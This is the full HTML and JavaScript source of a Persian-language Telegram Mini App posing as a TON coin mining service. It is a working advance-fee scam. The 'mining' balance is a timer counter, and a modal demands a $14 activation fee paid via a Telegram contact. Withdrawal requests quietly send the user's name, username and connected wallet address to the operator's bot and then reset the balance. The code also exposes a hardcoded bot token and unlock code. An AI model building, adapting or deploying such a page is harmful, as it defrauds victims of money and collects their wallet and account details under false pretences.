<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Dropy - PRO v28</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
        
        body {
            margin: 0; font-family: 'Vazirmatn', sans-serif;
            background: radial-gradient(circle at top, #0f1c2e, #070b14);
            color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
        }

        /* پاپ‌آپ شیشه‌ای فعالسازی */
        #feeModal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.88); backdrop-filter: blur(18px);
            z-index: 10000; display: flex; align-items: center; justify-content: center;
        }

        .modal-content {
            background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 30px 20px; border-radius: 35px; width: 88%; text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
        }

        .fee-highlight { 
            background: rgba(0, 255, 157, 0.1); border: 1px dashed #00ff9d;
            color: #00ff9d; padding: 15px; border-radius: 20px;
            font-weight: 800; font-size: 18px; display: block; margin: 20px 0; 
        }

        /* ورودی رمز عبور */
        .activation-box {
            margin-top: 25px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1);
        }

        #activationInput {
            width: 100%; padding: 14px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.2);
            background: rgba(0,0,0,0.3); color: #fff; text-align: center; font-family: sans-serif;
            font-size: 18px; margin-bottom: 12px; outline: none; box-sizing: border-box; letter-spacing: 2px;
        }

        /* استایل‌های اصلی بدنه */
        .profile-card {
            background: rgba(255, 255, 255, 0.08); border-radius: 24px; padding: 18px;
            display: flex; align-items: center; gap: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1);
        }

        .avatar-container {
            width: 60px; height: 60px; border-radius: 50%; border: 2px solid #00c6ff;
            background: #1a1a1a; display: flex; align-items: center; justify-content: center; overflow: hidden;
        }

        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
        .user-details h3 { margin: 0; font-size: 16px; font-weight: 800; }
        .user-details p { margin: 2px 0; font-size: 11px; color: #00c6ff; direction: ltr; text-align: right; }

        .card {
            background: rgba(255, 255, 255, 0.05); border-radius: 25px;
            padding: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 15px; text-align: center;
        }

        #balance { font-size: 42px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; text-shadow: 0 0 15px rgba(0,198,255,0.3); }

        .btn-action {
            width: 100%; padding: 16px; border-radius: 18px; border: none;
            font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.3s;
            display: flex; align-items: center; justify-content: center; gap: 10px;
            text-decoration: none; color: #fff; box-sizing: border-box;
        }

        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); box-shadow: 0 4px 15px rgba(255,81,47,0.3); }
        .support-btn { background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 10px; }
        
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div id="feeModal">
    <div class="modal-content">
        <i class="fas fa-user-shield" style="font-size: 50px; color: #ff512f; margin-bottom: 15px;"></i>
        <h2 style="font-weight: 800;">تایید اصالت حساب</h2>
        <p style="font-size: 13px; color: #ccc;">برای آزادسازی کیف پول و امکان برداشت، باید کارمزد فعالسازی شبکه را پرداخت کنید:</p>
        
        <div class="fee-highlight">
            14 دلار | 2,226,000 تومان
        </div>
        
        <a href="https://t.me/miningertoncoin" class="btn-action" style="background: #0088cc; margin-bottom: 15px;">
            <i class="fas fa-receipt"></i> دریافت رمز پس از پرداخت
        </a>

        <div class="activation-box">
            <p style="font-size: 11px; color: #aaa; margin-bottom: 10px;">وارد کردن رمز فعالسازی:</p>
            <input type="text" id="activationInput" placeholder="Code Here...">
            <button onclick="verifyActivation()" class="btn-action" style="background: #1faa59; padding: 14px;">فعالسازی آنی</button>
        </div>
    </div>
</div>

<div class="profile-card">
    <div class="avatar-container">
        <i class="fas fa-user-astronaut" id="defaultAvatar" style="font-size: 30px; color:#00c6ff;"></i>
        <img id="userPhoto" src="" class="hidden">
    </div>
    <div class="user-details">
        <h3 id="userName">در حال لود...</h3>
        <p id="userTag">@username</p>
        <p style="font-size: 10px; color: #aaa;" id="joinDate">عضویت: --/--/--</p>
    </div>
</div>

<div class="card">
    <p style="margin:0; font-size:12px; color:#aaa;">موجودی قابل برداشت (TON)</p>
    <span id="balance">0.000000</span>
    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-microchip"></i> استخراج هوشمند فعال است</div>
</div>

<div class="card">
    <button id="connectBtn" class="btn-action" style="background: #0088cc;">
        <i class="fas fa-wallet"></i> <span>اتصال کیف پول</span>
    </button>
</div>

<div class="card">
    <button id="withdrawBtn" class="btn-action withdraw-btn">درخواست برداشت سریع</button>
    <a href="https://t.me/miningertoncoin" class="btn-action support-btn">
        <i class="fas fa-headset"></i> ارتباط با پشتیبانی
    </a>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // تنظیمات امنیتی ادمین
    const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
    const ADMIN_ID = "5972276401";
    const SECRET_CODE = "T61O96N12"; // رمز اختصاصی شما

    let bal = parseFloat(localStorage.getItem('bal_v28')) || 0;

    // بررسی وضعیت قبلی
    if(localStorage.getItem('isActivated') === 'true') {
        document.getElementById('feeModal').classList.add('hidden');
    }

    // تابع بررسی رمز
    function verifyActivation() {
        const input = document.getElementById('activationInput').value.trim();
        if(input === SECRET_CODE) {
            localStorage.setItem('isActivated', 'true');
            document.getElementById('feeModal').style.display = 'none';
            tg.showAlert("✅ حساب شما با موفقیت فعال شد. اکنون می‌توانید برداشت کنید.");
            
            // اطلاع به ادمین
            const user = tg.initDataUnsafe?.user;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent('🔓 کاربر حساب خود را فعال کرد: ' + (user?.username || user?.first_name))}&parse_mode=HTML`);
        } else {
            tg.showAlert("❌ رمز وارد شده نامعتبر است.");
        }
    }

    // استخراج مداوم
    setInterval(() => {
        bal += 0.000012;
        document.getElementById('balance').innerText = bal.toFixed(6);
        localStorage.setItem('bal_v28', bal.toString());
    }, 1000);

    // تنظیمات TON Connect
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json'
    });

    // دکمه برداشت
    document.getElementById('withdrawBtn').onclick = () => {
        if(localStorage.getItem('isActivated') !== 'true') {
            tg.showAlert("❌ حساب شما فعال نیست. لطفا کارمزد را پرداخت و رمز فعالسازی دریافت کنید.");
            return;
        }
        if(!tonConnectUI.connected) {
            tg.showAlert("⚠️ ابتدا کیف پول خود را متصل کنید.");
            return;
        }
        
        const user = tg.initDataUnsafe?.user;
        const msg = `💰 <b>درخواست برداشت</b>\n👤: ${user?.first_name}\n💵 مقدار: ${bal.toFixed(6)} TON\n👛 ولت: <code>${tonConnectUI.account.address}</code>`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
        
        tg.showAlert("درخواست برداشت با موفقیت ثبت شد. واریز پس از تایید مدیریت انجام می‌شود. ✅", () => {
            bal = 0;
            localStorage.setItem('bal_v28', '0');
            document.getElementById('balance').innerText = "0.000000";
        });
    };

    // لود اطلاعات کاربر
    const user = tg.initDataUnsafe?.user;
    if (user) {
        document.getElementById('userName').innerText = user.first_name;
        document.getElementById('userTag').innerText = user.username ? "@" + user.username : "ID: " + user.id;
        if (user.photo_url) {
            const img = document.getElementById('userPhoto');
            img.src = user.photo_url; img.classList.remove('hidden');
            document.getElementById('defaultAvatar').classList.add('hidden');
        }
    }
</script>
</body>
</html>
